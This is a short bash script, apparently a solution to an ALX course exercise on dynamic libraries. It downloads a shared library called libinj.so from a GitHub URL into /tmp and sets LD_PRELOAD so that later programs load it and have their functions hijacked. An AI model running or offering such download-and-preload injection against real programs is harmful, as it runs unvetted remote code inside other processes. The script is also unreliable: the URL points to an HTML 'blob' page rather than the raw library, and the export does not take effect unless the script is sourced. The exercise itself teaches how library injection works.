#!/bin/bash
wget -P /tmp https://github.com/RevolverSnake412/alx-low_level_programming/blob/main/0x18-dynamic_libraries/libinj.so
export LD_PRELOAD=/tmp/libinj.so
